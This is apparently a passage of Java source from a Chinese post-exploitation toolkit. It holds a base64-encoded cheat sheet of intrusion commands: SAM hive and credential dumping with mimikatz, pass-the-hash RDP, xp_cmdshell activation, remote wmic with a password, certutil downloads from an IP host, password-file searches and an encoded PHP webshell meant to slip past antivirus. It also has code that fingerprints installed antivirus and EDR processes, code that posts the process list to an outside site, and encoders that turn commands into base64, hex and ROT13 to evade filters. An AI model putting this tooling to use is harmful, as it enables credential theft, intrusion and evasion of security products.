DogcmVnIHNhdmUgaGtsbVxzYW0gYzpccHJvZ3JhbWRhdGFcc2FtLmhpdmUgJiYgcmVnIHNhdmUgaGtsbVxzeXN0ZW0gYzpccHJvZ3JhbWRhdGFcc3lzdGVtLmhpdmUKbWltaWthdHror7vlj5bms6jlhozooajlr7zlh7rnmoRoYXNo5L+h5oGvOiBtaW1pa2F0eiAibG9nIiAibHNhZHVtcDo6c2FtIC9zYW06c2FtLmhpdmUgL3N5c3RlbTpzeXN0ZW0uaGl2ZSIgImV4aXQiCmltcGFja2V05YyF55qEc2VjcmV0c2R1bXA6IHNlY3JldHNkdW1wLmV4ZSAtc2FtIHNhbS5oaXZlIC1zeXN0ZW0gc3lzdGVtLmhpdmUgTE9DQUwKbm1hcOaJq+aPj+awuOaBkuS5i+iTnea8j+a0njogbm1hcCAtcDQ0NSAtLXNjcmlwdCBzbWItdnVsbi1tczE3LTAxMCAxMjcuMC4wLjEKbWV0ZXJwcmV0ZXLmiornm67moIfnmoQzMzg556uv5Y+j6L2s5Y+R5YiwdnBz55qENjY2Nuerr+WPozogcG9ydGZ3ZCBhZGQgLWwgNjY2NiAtcCAzMzg5IC1yIDEyNy4wLjAuMQphdHRyaWLliJvlu7rpmpDol4/mlofku7Y6IGF0dHJpYiArcyAraCArciAqLmV4ZQoubmV06Z2Z6buY5a6J6KOFOiBkb3ROZXRGeDQwX0Z1bGxfeDg2X3g2NC5leGUgL3EgL25vcmVzdGFydCAvQ2hhaW5pbmdQYWNrYWdlIEZ1bGxYNjRCb290c3RyYXBwZXIKbGN456uv5Y+j6L2s5Y+ROiDmnKzlnLDnm5HlkKw6IGxjeC5leGUgLWxpc3RlbiAxMTAgMzQ1Njfnm67moIfmiafooYw6IGxjeC5leGUgLXNsYXZlIHZwc2lwIDExMCAxMjcuMC4wLjEgMzM4OQrmiavmj493ZWIudHh05paH5Lu255qE572R56uZ5qCH6aKYOiB3aGF0d2ViIC1pIHdlYi50eHQgLXAgVGl0bGUgd2hhdHdlYgpXaW7nu4jnq6/orr7nva7ku6PnkIY6IHNldCBodHRwX3Byb3h5PXNvY2tzNTovLzEyNy4wLjAuMToxMDgwICYmIHNldCBodHRwc19wcm94eT1zb2NrczU6Ly8xMjcuMC4wLjE6MTA4MAp4ZnJlZXJkcCBoYXNo6L+e5o6lcmRwOiB4ZnJlZXJkcCAvdTphZG1pbmlzdHJhdG9yIC9wdGg6Y2NlZjIwOGM2NDg1MjY5YzIwZGIyY2FkMjE3MzRmZTcgL3Y6MTAuMjAuMjQuMTAwIC9jZXJ0LWlnbm9yZSAvL3NlcnZlciAyMDEyCnJ1bmFz6L+Q6KGM5YW25a6D6LSm5oi35p2D6ZmQ55qE56iL5bqPIDogcnVuYXMgL3VzZXI6aG9zdG5hbWVcdXNlcm5hbWUgL3NhICJjbWQuZXhlIgoK57O757uf5LiL6L295paH5Lu2OgoKd2luZG93czIwMDPpu5jorqTmlofku7Y6IEJsb2IwXzAuYmluIC8v5Y+v5Lul5q2j5bi45omn6KGMCmNlcnR1dGls5LiL6L295paH5Lu2OiBjZXJ0dXRpbCAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xOTIuMTY4LjUuMjE6ODg4L25jLnR4dCBjOlxuYy50eHQKY2VydHV0aWzliKDpmaTorrDlvZU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzE5Mi4xNjguMS4xMTUvcm9ib3RzLnR4dCBkZWxldGUKYml0c2FkbWlu5LiL6L295paH5Lu2OiBiaXRzYWRtaW4gL3Jhd3JldHVybiAvdHJhbnNmZXIgZ2V0ZmlsZSBodHRwOi8vZG93bmxvYWQuc3lzaW50ZXJuYWxzLmNvbS9maWxlcy9QU1Rvb2xzLnppcCBjOlxQc3Rvb2xzLnppcAoKTXNzcWznjq/looM6Cgptc3NxbOW8gOWQr3hwX2NtZHNoZWxsOiBFWEVDIHNwX2NvbmZpZ3VyZSAnc2hvdyBhZHZhbmNlZCBvcHRpb25zJywgMTtSRUNPTkZJR1VSRTtFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLCAxO1JFQ09ORklHVVJFOwptc3NxbOi+k+WHuuaWh+S7tjogZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICc+PmM6XHdpbmRvd3NcdGVtcFxpbmZvLnR4dCBzZXQgL3A9ImJhc2U2NF9lbmNvZGUiIDxudWwnOyAvL+S7o+abv2VjaG/ovpPlh7oK5p+l55yLY+ebmOS4i3dlYi5jb25maWfmlofku7Y6IGZpbmRzdHIgL2M6IlVzZXIgSWQ9IiAvYzoiUGFzc3dvcmQ9IiAvc2kgd2ViLmNvbmZpZyA+PiB0bXBzLmxvZ3MgPG51bCc7CuW4uOinhOW3peS9nOe7hOWGhee9keeOr+Wig+S4i+eahG1zc3Fs5a6e5L6LOiBQb3dlclNoZWxsIC1Db21tYW5kICJbU3lzdGVtLkRhdGEuU3FsLlNxbERhdGFTb3VyY2VFbnVtZXJhdG9yXTo6SW5zdGFuY2UuR2V0RGF0YVNvdXJjZXMoKSIKCldtaWPlkb3ku6Q6Cgp3bWlj6L+c56iL6L+e5o6l5py65ZmoOiB3bWljIC9ub2RlOiIxOTIuMTY4LjEuMjAiIC91c2VyOiJkb21haW5cYWRtaW5pc3RyYXRvciIgL3Bhc3N3b3JkOiIxMjM0NTYiCuafpeeci+ezu+e7n+Wuieijhei9r+S7tjogd21pYyBwcm9kdWN0IGdldCBuYW1lLHZlcnNpb24K5p+l55yL57O757uf54mI5pysOiB3bWljIE9TIGdldCBDYXB0aW9uLENTRFZlcnNpb24sT1NBcmNoaXRlY3R1cmUsVmVyc2lvbgrmoLnmja5QaWTmn6Xmib7ov5vnqIvot6/lvoQ6IHdtaWMgcHJvY2VzcyBnZXQgbmFtZSxleGVjdXRhYmxlcGF0aCxwcm9jZXNzaWR8ZmluZHN0ciBwaWQK5p+l55yL56OB55uY5L+h5oGvOiBXbWljIGxvZ2ljYWxkaXNrCuafpeeci+e7hCxob3N0bmFtZSznrYnkv6Hmga86IHdtaWMgY29tcHV0ZXJzeXN0ZW0gZ2V0IE5hbWUsIERvbWFpbiwgTWFudWZhY3R1cmVyLCBNb2RlbCwgVXNlcm5hbWUsIFJvbGVzL2Zvcm1hdDpsaXN0CgpMaW51eOWRveS7pOaUtumbhgpMaW51eOe7iOerr+W8gOWQr3NvY2tz5Luj55CGOgoKbGludXjorr7nva7nu4jnq6/ku6PnkIY6IGV4cG9ydCBodHRwc19wcm94eT1odHRwOi8vMTI3LjAuMC4xOjc4OTAgaHR0cF9wcm94eT1odHRwOi8vMTI3LjAuMC4xOjc4OTAgYWxsX3Byb3h5PXNvY2tzNTovLzEyNy4wLjAuMTo3ODkwCmxpbnjnu4jnq6/mkJzntKLova/ku7Y6IGZpbmQgLyAtbmFtZSBwYXNzLnR4dApsaW51eOafpeaJvuWQjue8gHByb3BlcnRpZXPmlofku7blhoXlrrnluKZwYXNzd29yZOWtl+agtzogZmluZCAvIC1uYW1lICoucHJvcGVydGllcyB8IHhhcmdzIGdyZXAgcGFzc3dvcmQgLy94bWwsc2gscHl0aG9uLOetieetiQpsaW51eOaKinRvbWNhdOebruW9leaWh+S7tuWSjOaWh+S7tuWkueWIl+ihqOWvvOWHuuWIsG9hLnR4dDogZmluZCAvaG9tZS90b21jYXQvIC10eXBlIGYgPiBvYS50eHQK57yW56CB5a2X56ymYmFzZTY054S25ZCOZWNob+i+k+WHumxvZ28ucGhw5Zyo6L+b6KGM6Kej56CBOiBlY2hvIC1uICJQRDl3YUhBZ1pYWmhiQ2drWDFCUFUxUmJZMjFrWFNrN1B6NCsiIHwgYmFzZTY0IC1kID4gbG9nby5waHAgLy/lj6/nu5Xov4fmnYDova/mi6bmiKrlhbPplK7lrZcKCgo=";
        data = base64_decode(data);
        return data;
    }

    //windows本地查询进程
    private String windows_local_tasklist(String tasklist){
        String data = "";
        tasklist = "\n"+tasklist;
        String[] data_list = {"360tray.exe|360安全卫士-实时保护","360safe.exe|360安全卫士-主程序","ZhuDongFangYu.exe|360安全卫士-主动防御","360sd.exe|360杀毒","a2guard.exe|a-squared杀毒","ad-watch.exe|Lavasoft杀毒","cleaner8.exe|The Cleaner杀毒","vba32lder.exe|vb32杀毒","MongoosaGUI.exe|Mongoosa杀毒","CorantiControlCenter32.exe|Coranti2012杀毒","F-PROT.exe|F-Prot AntiVirus","CMCTrayIcon.exe|CMC杀毒","K7TSecurity.exe|K7杀毒","UnThreat.exe|UnThreat杀毒","CKSoftShiedAntivirus4.exe|Shield Antivirus杀毒","AVWatchService.exe|VIRUSfighter杀毒","ArcaTasksService.exe|ArcaVir杀毒","iptray.exe|Immunet杀毒","PSafeSysTray.exe|PSafe杀毒","nspupsvc.exe|nProtect杀毒","SpywareTerminatorShield.exe|SpywareTerminator反间谍软件","BKavService.exe|Bkav杀毒","MsMpEng.exe|Microsoft Security Essentials","SBAMSvc.exe|VIPRE","ccSvcHst.exe|Norton杀毒","f-secure.exe|冰岛","avp.exe|Kaspersky","KvMonXP.exe|江民杀毒","RavMonD.exe|瑞星杀毒","Mcshield.exe|McAfee","Tbmon.exe|McAfee","Frameworkservice.exe|McAfee","egui.exe|ESET NOD32","ekrn.exe|ESET NOD32","eguiProxy.exe|ESET NOD32","kxetray.exe|金山毒霸","knsdtray.exe|可牛杀毒","TMBMSRV.exe|趋势杀毒","avcenter.exe|Avira(小红伞)","avguard.exe|Avira(小红伞)","avgnt.exe|Avira(小红伞)","sched.exe|Avira(小红伞)","ashDisp.exe|Avast网络安全","rtvscan.exe|诺顿杀毒","ccapp.exe|SymantecNorton","NPFMntor.exe|Norton杀毒软件","ccSetMgr.exe|赛门铁克","ccRegVfy.exe|Norton杀毒软件","ksafe.exe|金山卫士","QQPCRTP.exe|QQ电脑管家","avgwdsvc.exe|AVG杀毒","QUHLPSVC.exe|QUICK HEAL杀毒","mssecess.exe|微软杀毒","SavProgress.exe|Sophos杀毒","SophosUI.exe|Sophos杀毒","SophosFS.exe|Sophos杀毒","SophosHealth.exe|Sophos杀毒","SophosSafestore64.exe|Sophos杀毒","SophosCleanM.exe|Sophos杀毒","fsavgui.exe|F-Secure杀毒","vsserv.exe|比特梵德","remupd.exe|熊猫卫士","FortiTray.exe|飞塔","safedog.exe|安全狗","parmor.exe|木马克星","Iparmor.exe.exe|木马克星","beikesan.exe|贝壳云安全","KSWebShield.exe|金山网盾","TrojanHunter.exe|木马猎手","GG.exe|巨盾网游安全盾","adam.exe|绿鹰安全精灵","AST.exe|超级巡警","ananwidget.exe|墨者安全专家","AVK.exe|AntiVirusKit","avg.exe|AVG Anti-Virus","spidernt.exe|Dr.web","avgaurd.exe|Avira Antivir","vsmon.exe|Zone Alarm","cpf.exe|Comodo","outpost.exe|Outpost Firewall","rfwmain.exe|瑞星防火墙","kpfwtray.exe|金山网镖","FYFireWall.exe|风云防火墙","MPMon.exe|微点主动防御","pfw.exe|天网防火墙","BaiduSdSvc.exe|百度杀毒-服务进程","BaiduSdTray.exe|百度杀毒-托盘进程","BaiduSd.exe|百度杀毒-主程序","SafeDogGuardCenter.exe|安全狗","safedogupdatecenter.exe|安全狗","safedogguardcenter.exe|安全狗","SafeDogSiteIIS.exe|安全狗","SafeDogTray.exe|安全狗","SafeDogServerUI.exe|安全狗","D_Safe_Manage.exe|D盾","d_manage.exe|D盾","yunsuo_agent_service.exe|云锁","yunsuo_agent_daemon.exe|云锁","HwsPanel.exe|护卫神","hws_ui.exe|护卫神","hws.exe|护卫神","hwsd.exe|护卫神","hipstray.exe|火绒","wsctrl.exe|火绒","usysdiag.exe|火绒","SPHINX.exe|SPHINX防火墙","bddownloader.exe|百度卫士","baiduansvx.exe|百度卫士-主进程","AvastUI.exe|Avast!5主程序","emet_agent.exe|EMET","emet_service.exe|EMET","firesvc.exe|McAfee","firetray.exe|McAfee","hipsvc.exe|McAfee","mfevtps.exe|McAfee","mcafeefire.exe|McAfee","scan32.exe|McAfee","shstat.exe|McAfee","vstskmgr.exe|McAfee","engineserver.exe|McAfee","mfeann.exe|McAfee","mcscript.exe|McAfee","updaterui.exe|McAfee","udaterui.exe|McAfee","naprdmgr.exe|McAfee","cleanup.exe|McAfee","cmdagent.exe|McAfee","frminst.exe|McAfee","mcscript_inuse.exe|McAfee","mctray.exe|McAfee","_avp32.exe|卡巴斯基","_avpcc.exe|卡巴斯基","_avpm.exe|卡巴斯基","aAvgApi.exe|AVG","ackwin32.exe|已知杀软进程,名称暂未收录","alertsvc.exe|Norton AntiVirus","alogserv.exe|McAfee VirusScan","anti-trojan.exe|Anti-Trojan Elite","arr.exe|Application Request Route","atguard.exe|AntiVir","atupdater.exe|已知杀软进程,名称暂未收录","atwatch.exe|Mustek","au.exe|NSIS","aupdate.exe|Symantec","auto-protect.nav80try.exe|已知杀软进程,名称暂未收录","autodown.exe|AntiVirus AutoUpdater","avconsol.exe|McAfee","avgcc32.exe|AVG","avgctrl.exe|AVG","avgemc.exe|AVG","avgrsx.exe|AVG","avgserv.exe|AVG","avgserv9.exe|AVG","avgw.exe|AVG","avkpop.exe|G DATA SOFTWARE AG","avkserv.exe|G DATA SOFTWARE AG","avkservice.exe|G DATA SOFTWARE AG","avkwctl9.exe|G DATA SOFTWARE AG","avltmain.exe|Panda Software Aplication","avnt.exe|H+BEDV Datentechnik GmbH","avp32.exe|Kaspersky Anti-Virus","avpcc.exe| Kaspersky AntiVirus","avpdos32.exe| Kaspersky AntiVirus","avpm.exe| Kaspersky AntiVirus","avptc32.exe| Kaspersky AntiVirus","avpupd.exe| Kaspersky AntiVirus","avsynmgr.exe|McAfee","avwin.exe| H+BEDV","bargains.exe|Exact Advertising SpyWare","beagle.exe|Avast","blackd.exe|BlackICE","blackice.exe|BlackICE","blink.exe|micromedia","blss.exe|CBlaster","bootwarn.exe|Symantec","bpc.exe|Grokster","brasil.exe|Exact Advertising","ccevtmgr.exe|Norton Internet Security","cdp.exe|CyberLink Corp.","cfd.exe|Motive Communications","cfgwiz.exe| Norton AntiVirus","claw95.exe|已知杀软进程,名称暂未收录","claw95cf.exe|已知杀软进程,名称暂未收录","clean.exe|windows流氓软件清理大师","cleaner.exe|windows流氓软件清理大师","cleaner3.exe|windows流氓软件清理大师","cleanpc.exe|windows流氓软件清理大师","cpd.exe|McAfee","ctrl.exe|已知杀软进程,名称暂未收录","cv.exe|已知杀软进程,名称暂未收录","defalert.exe|Symantec","defscangui.exe|Symantec","defwatch.exe|Norton Antivirus","doors.exe|已知杀软进程,名称暂未收录","dpf.exe|已知杀软进程,名称暂未收录","dpps2.exe|PanicWare","dssagent.exe|Broderbund","ecengine.exe|已知杀软进程,名称暂未收录","emsw.exe|Alset Inc","ent.exe|已知杀软进程,名称暂未收录","espwatch.exe|已知杀软进程,名称暂未收录","ethereal.exe|RationalClearCase","exe.avxw.exe|已知杀软进程,名称暂未收录","expert.exe|已知杀软进程,名称暂未收录","f-prot95.exe|已知杀软进程,名称暂未收录","fameh32.exe|F-Secure","fast.exe| FastUsr","fch32.exe|F-Secure","fih32.exe|F-Secure","findviru.exe|F-Secure","firewall.exe|AshampooSoftware","fnrb32.exe|F-Secure","fp-win.exe| F-Prot Antivirus OnDemand","fsaa.exe|F-Secure","fsav.exe|F-Secure","fsav32.exe|F-Secure","fsav530stbyb.exe|F-Secure","fsav530wtbyb.exe|F-Secure","fsav95.exe|F-Secure","fsgk32.exe|F-Secure","fsm32.exe|F-Secure","fsma32.exe|F-Secure","fsmb32.exe|F-Secure","gbmenu.exe|已知杀软进程,名称暂未收录","guard.exe|ewido","guarddog.exe|ewido","htlog.exe|已知杀软进程,名称暂未收录","htpatch.exe|Silicon Integrated Systems Corporation","hwpe.exe|已知杀软进程,名称暂未收录","iamapp.exe|Symantec","iamserv.exe|Symantec","iamstats.exe|Symantec","iedriver.exe| Urlblaze.com","iface.exe|Panda Antivirus Module","infus.exe|Infus Dialer","infwin.exe|Msviewparasite","intdel.exe|Inet Delivery","intren.exe|已知杀软进程,名称暂未收录","jammer.exe|已知杀软进程,名称暂未收录","kavpf.exe|Kapersky","kazza.exe|Kapersky","keenvalue.exe|EUNIVERSE INC","launcher.exe|Intercort Systems","ldpro.exe|已知杀软进程,名称暂未收录","ldscan.exe|Windows Trojans Inspector","localnet.exe|已知杀软进程,名称暂未收录","luall.exe|Symantec","luau.exe|Symantec","lucomserver.exe|Norton","mcagent.exe|McAfee","mcmnhdlr.exe|McAfee","mctool.exe|McAfee","mcupdate.exe|McAfee","mcvsrte.exe|McAfee","mcvsshld.exe|McAfee","mfin32.exe|MyFreeInternetUpdate","mfw2en.exe|MyFreeInternetUpdate","mfweng3.02d30.exe|MyFreeInternetUpdate","mgavrtcl.exe|McAfee","mgavrte.exe|McAfee","mghtml.exe|McAfee","mgui.exe|BullGuard","minilog.exe|Zone Labs Inc","mmod.exe|EzulaInc","mostat.exe|WurldMediaInc","mpfagent.exe|McAfee","mpfservice.exe|McAfee","mpftray.exe|McAfee","mscache.exe|Integrated Search Technologies Spyware","mscman.exe|OdysseusMarketingInc","msmgt.exe|Total Velocity Spyware","msvxd.exe|W32/Datom-A","mwatch.exe|已知杀软进程,名称暂未收录","nav.exe|Reuters Limited","navapsvc.exe|Norton AntiVirus","navapw32.exe|Norton AntiVirus","navw32.exe|Norton Antivirus","ndd32.exe|诺顿磁盘医生","neowatchlog.exe|已知杀软进程,名称暂未收录","netutils.exe|已知杀软进程,名称暂未收录","nisserv.exe|Norton","nisum.exe|Norton","nmain.exe|Norton","nod32.exe|ESET Smart Security","norton_internet_secu_3.0_407.exe|已知杀软进程,名称暂未收录","notstart.exe|已知杀软进程,名称暂未收录","nprotect.exe|Symantec","npscheck.exe|Norton","npssvc.exe|Norton","ntrtscan.exe|趋势反病毒应用程序","nui.exe|已知杀软进程,名称暂未收录","otfix.exe|已知杀软进程,名称暂未收录","outpostinstall.exe|Outpost","patch.exe|趋势科技","pavw.exe|已知杀软进程,名称暂未收录","pcscan.exe|趋势科技","pdsetup.exe|已知杀软进程,名称暂未收录","persfw.exe|Tiny Personal Firewall","pgmonitr.exe|PromulGate SpyWare","pingscan.exe|已知杀软进程,名称暂未收录","platin.exe|已知杀软进程,名称暂未收录","pop3trap.exe|PC-cillin","poproxy.exe|NortonAntiVirus","popscan.exe|已知杀软进程,名称暂未收录","powerscan.exe|Integrated Search Technologies","ppinupdt.exe|已知杀软进程,名称暂未收录","pptbc.exe|已知杀软进程,名称暂未收录","ppvstop.exe|已知杀软进程,名称暂未收录","prizesurfer.exe|Prizesurfer","prmt.exe|OpiStat","prmvr.exe|Adtomi","processmonitor.exe|Sysinternals","proport.exe|已知杀软进程,名称暂未收录","protectx.exe|ProtectX","pspf.exe|已知杀软进程,名称暂未收录","purge.exe|已知杀软进程,名称暂未收录","qconsole.exe|Norton AntiVirus Quarantine Console","qserver.exe|Norton Internet Security","rapapp.exe|BlackICE","rb32.exe|RapidBlaster","rcsync.exe|PrizeSurfer","realmon.exe|Realmon ","rescue.exe|已知杀软进程,名称暂未收录","rescue32.exe|卡巴斯基互联网安全套装","rshell.exe|已知杀软进程,名称暂未收录","rtvscn95.exe|Real-time virus scanner ","rulaunch.exe|McAfee User Interface","run32dll.exe|PAL PC Spy","safeweb.exe|PSafe Tecnologia","sbserv.exe|Norton Antivirus","scrscan.exe|360杀毒","sfc.exe|System file checker","sh.exe|MKS Toolkit for Win3","showbehind.exe|MicroSmarts Enterprise Component ","soap.exe|System Soap Pro","sofi.exe|已知杀软进程,名称暂未收录","sperm.exe|已知杀软进程,名称暂未收录","supporter5.exe|eScorcher反病毒","symproxysvc.exe|Symantec","symtray.exe|Symantec","tbscan.exe|ThunderBYTE","tc.exe|TimeCalende","titanin.exe|TitanHide","tvmd.exe|Total Velocity","tvtmd.exe| Total Velocity","vettray.exe|eTrust","vir-help.exe|已知杀软进程,名称暂未收录","vnpc3000.exe|已知杀软进程,名称暂未收录","vpc32.exe|Symantec","vpc42.exe|Symantec","vshwin32.exe|McAfee","vsmain.exe|McAfee","vsstat.exe|McAfee","wfindv32.exe|已知杀软进程,名称暂未收录","zapro.exe|Zone Alarm","zonealarm.exe|Zone Alarm","AVPM.exe|Kaspersky","A2CMD.exe|Emsisoft Anti-Malware","A2SERVICE.exe|a-squared free","A2FREE.exe|a-squared Free","ADVCHK.exe|Norton AntiVirus","AGB.exe|安天防线","AHPROCMONSERVER.exe|安天防线","AIRDEFENSE.exe|AirDefense","ALERTSVC.exe|Norton AntiVirus","AVIRA.exe|小红伞杀毒","AMON.exe|Tiny Personal Firewall","AVZ.exe|AVZ","ANTIVIR.exe|已知杀软进程,名称暂未收录","APVXDWIN.exe|熊猫卫士","ASHMAISV.exe|Alwil","ASHSERV.exe|Avast Anti-virus","ASHSIMPL.exe|AVAST!VirusCleaner","ASHWEBSV.exe|Avast","ASWUPDSV.exe|Avast","ASWSCAN.exe|Avast","AVCIMAN.exe|熊猫卫士","AVCONSOL.exe|McAfee","AVENGINE.exe|熊猫卫士","AVESVC.exe|Avira AntiVir Security Service","AVEVL32.exe|已知杀软进程,名称暂未收录","AVGAM.exe|AVG","AVGCC.exe|AVG","AVGCHSVX.exe|AVG","AVGCSRVX|AVG","AVGNSX.exe|AVG","AVGCC32.exe|AVG","AVGCTRL.exe|AVG","AVGEMC.exe|AVG","AVGFWSRV.exe|AVG","AVGNTMGR.exe|AVG","AVGSERV.exe|AVG","AVGTRAY.exe|AVG","AVGUPSVC.exe|AVG","AVINITNT.exe|Command AntiVirus for NT Server","AVPCC.exe|Kaspersky","AVSERVER.exe|Kerio MailServer","AVSCHED32.exe|H+BEDV","AVSYNMGR.exe|McAfee","AVWUPSRV.exe|H+BEDV","BDSWITCH.exe|BitDefender Module","BLACKD.exe|BlackICE","CCEVTMGR.exe|Symantec","CFP.exe|COMODO","CLAMWIN.exe|ClamWin Portable","CUREIT.exe|DrWeb CureIT","DEFWATCH.exe|Norton Antivirus","DRWADINS.exe|Dr.Web","DRWEB.exe|Dr.Web","DEFENDERDAEMON.exe|ShadowDefender","EWIDOCTRL.exe|Ewido Security Suite","EZANTIVIRUSREGISTRATIONCHECK.exe|e-Trust Antivirus","FIREWALL.exe|AshampooSoftware","FPROTTRAY.exe|F-PROT Antivirus","FPWIN.exe|Verizon","FRESHCLAM.exe|ClamAV","FSAV32.exe|F-Secure","FSBWSYS.exe|F-secure","FSDFWD.exe|F-Secure","FSGK32.exe|F-Secure","FSGK32ST.exe|F-Secure","FSMA32.exe|F-Secure","FSMB32.exe|F-Secure","FSSM32.exe|F-Secure","GUARDGUI.exe|网游保镖","GUARDNT.exe|IKARUS","IAMAPP.exe|Symantec","INOCIT.exe|eTrust","INORPC.exe|eTrust","INORT.exe|eTrust","INOTASK.exe|eTrust","INOUPTNG.exe|eTrust","ISAFE.exe|eTrust","KAV.exe|Kaspersky","KAVMM.exe|Kaspersky","KAVPF.exe|Kaspersky","KAVPFW.exe|Kaspersky","KAVSTART.exe|Kaspersky","KAVSVC.exe|Kaspersky","KAVSVCUI.exe|Kaspersky","KMAILMON.exe|金山毒霸","MCAGENT.exe|McAfee","MCMNHDLR.exe|McAfee","MCREGWIZ.exe|McAfee","MCUPDATE.exe|McAfee","MCVSSHLD.exe|McAfee","MINILOG.exe|Zone Alarm","MYAGTSVC.exe|McAfee","MYAGTTRY.exe|McAfee","NAVAPSVC.exe|Norton","NAVAPW32.exe|Norton","NAVLU32.exe|Norton","NAVW32.exe|Norton Antivirus","NEOWATCHLOG.exe|NeoWatch","NEOWATCHTRAY.exe|NeoWatch","NISSERV.exe|Norton","NISUM.exe|Norton","NMAIN.exe|Norton","NOD32.exe|ESET NOD32","NPFMSG.exe|Norman个人防火墙","NPROTECT.exe|Symantec","NSMDTR.exe|Norton","NTRTSCAN.exe|趋势科技","OFCPFWSVC.exe|OfficeScanNT","ONLINENT.exe|已知杀软进程,名称暂未收录","OP_MON.exe| OutpostFirewall","PAVFIRES.exe|熊猫卫士","PAVFNSVR.exe|熊猫卫士","PAVKRE.exe|熊猫卫士","PAVPROT.exe|熊猫卫士","PAVPROXY.exe|熊猫卫士","PAVPRSRV.exe|熊猫卫士","PAVSRV51.exe|熊猫卫士","PAVSS.exe|熊猫卫士","PCCGUIDE.exe|PC-cillin","PCCIOMON.exe|PC-cillin","PCCNTMON.exe|PC-cillin","PCCPFW.exe|趋势科技","PCCTLCOM.exe|趋势科技","PCTAV.exe|PC Tools AntiVirus","PERSFW.exe|Tiny Personal Firewall","PERVAC.exe|已知杀软进程,名称暂未收录","PESTPATROL.exe|Ikarus","PREVSRV.exe|熊猫卫士","RTVSCN95.exe|Real-time Virus Scanner","SAVADMINSERVICE.exe|SAV","SAVMAIN.exe|SAV","SAVSCAN.exe|SAV","SDHELP.exe|Spyware Doctor","SHSTAT.exe|McAfee","SPBBCSVC.exe|Symantec","SPIDERCPL.exe|Dr.Web","SPIDERML.exe|Dr.Web","SPIDERUI.exe|Dr.Web","SPYBOTSD.exe|Spybot ","SWAGENT.exe|SonicWALL","SWDOCTOR.exe|SonicWALL","SWNETSUP.exe|Sophos","SYMLCSVC.exe|Symantec","SYMPROXYSVC.exe|Symantec","SYMSPORT.exe|Sysmantec","SYMWSC.exe|Sysmantec","SYNMGR.exe|Sysmantec","TMLISTEN.exe|趋势科技","TMNTSRV.exe|趋势科技","TMPROXY.exe|趋势科技","TNBUTIL.exe|Anti-Virus","VBA32ECM.exe|已知杀软进程,名称暂未收录","VBA32IFS.exe|已知杀软进程,名称暂未收录","VBA32PP3.exe|已知杀软进程,名称暂未收录","VCRMON.exe|VirusChaser","VRMONNT.exe|HAURI","VRMONSVC.exe|HAURI","VSHWIN32.exe|McAfee","VSSTAT.exe|McAfee","XCOMMSVR.exe|BitDefender","ZONEALARM.exe|Zone Alarm","360rp.exe|360杀毒","afwServ.exe| Avast Antivirus","safeboxTray.exe|360杀毒","360safebox.exe|360杀毒","QQPCTray.exe|QQ电脑管家","KSafeTray.exe|金山毒霸","KSafeSvc.exe|金山毒霸","KWatch.exe|金山毒霸","gov_defence_service.exe|云锁","gov_defence_daemon.exe|云锁","smartscreen.exe|Windows Defender","finalshell.exe|finalshell终端管理","navicat.exe|数据库管理","AliSecGuard.exe|阿里云盾","AliYunDunUpdate.exe|阿里云盾","AliYunDun.exe|阿里云盾","CmsGoAgent.windows-amd64.|阿里云监控"};
        List<String> data_list_2 = new ArrayList<>();
        Pattern pattern = Pattern.compile("\n.*?\\.exe");//匹配一个或多个字符
        Matcher matcher = pattern.matcher(tasklist);
        while(matcher.find())//matcher.find()用于查找是否有这个字符，有的话返回true
        {
            //start()返回上一个匹配项的起始索引
            //end()返回上一个匹配项的末尾索引。
            data_list_2.add(tasklist.substring(matcher.start(), matcher.end()));
        }

        for(int i=0;i<data_list_2.size();i++){
            String temp_data = data_list_2.get(i).substring(1);
            for(int i1=0;i1 < data_list.length;i1++){
                String[] temp_data_2 = data_list[i1].split("\\|");
                if(temp_data.equals(temp_data_2[0])){
                    data += data_list[i1].replace("|"," =======> ")+"\n";
                }
            }
        }

        return data;
    }

    //windows在线查询进程
    private String windows_api_tasklist(String tasklist){
        String data = "";
        String temp_data = "";
        String html_data = "";
        String temp_tasklist ="";
        tasklist = "\n"+tasklist;
        List<String> data_list = new ArrayList<>();

        Pattern pattern_tasklist = Pattern.compile("\n.*?\\.exe");//匹配一个或多个字符
        Matcher matcher_tasklist = pattern_tasklist.matcher(tasklist);
        while(matcher_tasklist.find())//matcher.find()用于查找是否有这个字符，有的话返回true
        {
            data_list.add(tasklist.substring(matcher_tasklist.start(), matcher_tasklist.end()));
        }
        for(int i=0;i<data_list.size();i++){
            temp_tasklist += data_list.get(i).substring(1)+"+";
        }

        html_data = sendPost("https://tasklist.pdsec.top/","avlist="+temp_tasklist+"&1=%E5%86%B2%21");
        if(html_data.equals("发送请求出现异常！")){
            data = html_data;
            return data;
        }
        Pattern pattern = Pattern.compile("<tbody id=\"tbody\">.*?</tbody>");//匹配一个或多个字符
        Matcher matcher = pattern.matcher(html_data);
        while(matcher.find())//matcher.find()用于查找是否有这个字符，有的话返回true
        {
            temp_data = html_data.substring(matcher.start(), matcher.end());
        }

        Pattern pattern_1 = Pattern.compile("<tr><td>.*?</font></td></tr>");//匹配一个或多个字符
        Matcher matcher_1 = pattern_1.matcher(temp_data);
        while(matcher_1.find())//matcher.find()用于查找是否有这个字符，有的话返回true
        {
            String temp_data_2 = "";
            temp_data_2 = temp_data.substring(matcher_1.start(), matcher_1.end()).replace("<tr><td>","");
            temp_data_2 = temp_data_2.replaceAll("</td><td><font color=.*?>"," =======> ");
            temp_data_2 = temp_data_2.replace("</font></td></tr>","");
            data +=temp_data_2+"\n";
        }

        return data;
    }

    //命令bypass
    private String[] command_Bypass_get(String command) {
        // Base64 编码
        String command_Bypass_1 = "Base64 编码:\n";
        String base64Encoded = Base64.getEncoder().encodeToString(command.getBytes());
        command_Bypass_1 += "echo " + base64Encoded + " | base64 --decode | sh";
        command_Bypass_1 += "\n或者\n`echo " + base64Encoded + " | base64 --decode`";

        // 十六进制编码
        String command_Bypass_2 ="十六进制编码:\n";
        StringBuilder hexEncoded = new StringBuilder();
        for (char c : command.toCharArray()) {
            hexEncoded.append(String.format("%02x", (int) c));
        }
        command_Bypass_2 += "echo " + hexEncoded.toString() + " | xxd -r -p | sh";
        command_Bypass_2 += "\n或者\n`echo " + hexEncoded.toString() + " | xxd -r -p`";

        // ROT13 编码
        String command_Bypass_3 = "ROT13 编码:\n";
        StringBuilder rot13Encoded = new StringBuilder();
        for (char c : command.toCharArray()) {
            if (c >= 'a' && c <= 'z') {
